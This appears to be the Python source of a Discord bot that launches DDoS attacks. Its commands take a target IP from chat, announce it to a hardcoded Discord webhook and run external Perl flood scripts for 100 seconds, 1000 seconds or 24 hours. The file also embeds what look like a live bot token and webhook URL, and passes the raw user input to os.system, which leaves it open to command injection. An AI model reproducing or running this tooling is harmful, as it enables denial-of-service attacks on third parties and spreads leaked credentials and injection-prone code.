
import asyncio
import discord
from discord.ext import commands
import os
from os import system
from discord_webhooks import DiscordWebhooks

token = "NzQ5MDE4MTc3MjA3NTMzNjcw.X0l3iQ.EHMVY8hZrSBjfxPHKYPl7ltgGT4"

client = commands.Bot("$", self_bot = False)

@client.event
async def on_ready():
	print("Bot is ready!!")
    
@client.command(aliases=['ddos1000'])
async def dos1000(ctx, *, ipxer: str):
    
    await ctx.send('DDoS Started! check  <#750038125862060152>')
    
    WEBHOOK_URL = 'https://discordapp.com/api/webhooks/750045740352667788/q71VgymARTPb-qLiS98cQSBOuAIJRZseLN6z-AhE2fRqFQXfCfp5dGjl_dcon4ZMJxUI'
    
    webhook = DiscordWebhooks(WEBHOOK_URL)
    
    webhook.add_field(name='`IPADRESS:`', value=ipxer, inline=True)
    
    webhook.add_field(name='`PORT:`', value='`80`', inline=True)
    
    webhook.add_field(name='`Seconds:`', value='`1000`', inline=True)
    
    webhook.set_footer(text='DDOS Started!', icon_url='https://www.logolynx.com/images/logolynx/3b/3bc09932e42516a9fa80e0b8dbb695e8.png')
    
    webhook.set_content(content='', color=0xff1100)
    
    webhook.send()
    
    os.system('perl Packet1000.pl ' + ipxer)
    pass
    
    await ctx.send('DDoS Completed!')
    
    os.system('python3 1bot.py')
    
    
@client.command(aliases=['ddos100'])
async def dos100(ctx, *, ipxer: str):
    
    await ctx.send('DDoS Started! check  <#750038125862060152>')
    
    WEBHOOK_URL = 'https://discordapp.com/api/webhooks/750045740352667788/q71VgymARTPb-qLiS98cQSBOuAIJRZseLN6z-AhE2fRqFQXfCfp5dGjl_dcon4ZMJxUI'
    
    webhook = DiscordWebhooks(WEBHOOK_URL)
    
    webhook.add_field(name='`IPADRESS:`', value=ipxer, inline=True)
    
    webhook.add_field(name='`PORT:`', value='`80`', inline=True)
    
    webhook.add_field(name='`Seconds:`', value='`100`', inline=True)
    
    webhook.set_footer(text='DDOS Started!', icon_url='https://www.logolynx.com/images/logolynx/3b/3bc09932e42516a9fa80e0b8dbb695e8.png')
    
    webhook.set_content(content='', color=0xff1100)
    
    webhook.send()
    
    os.system('perl Packet100.pl ' + ipxer)
    pass
    
    await ctx.send('DDoS Completed!')
    
    os.system('python3 1bot.py')

@client.command()
async def dos24hrs(ctx, *, ipxer: str):
    
    await ctx.send('DDoS Started! check  <#750038125862060152>')
    
    WEBHOOK_URL = 'https://discordapp.com/api/webhooks/750045740352667788/q71VgymARTPb-qLiS98cQSBOuAIJRZseLN6z-AhE2fRqFQXfCfp5dGjl_dcon4ZMJxUI'
    
    webhook = DiscordWebhooks(WEBHOOK_URL)
    
    webhook.add_field(name='`IPADRESS:`', value=ipxer, inline=True)
    
    webhook.add_field(name='`PORT:`', value='`80`', inline=True)
    
    webhook.add_field(name='`Hours:`', value='`24`', inline=True)
    
    webhook.set_footer(text='DDOS Started!', icon_url='https://www.logolynx.com/images/logolynx/3b/3bc09932e42516a9fa80e0b8dbb695e8.png')
    
    webhook.set_content(content='', color=0xff1100)
    
    webhook.send()
    
    os.system('perl Packet86400.pl ' + ipxer)
    pass
    
    await ctx.send('DDoS Completed!')
    
    os.system('python3 1bot.py')    
    

client.run(token, bot=True)
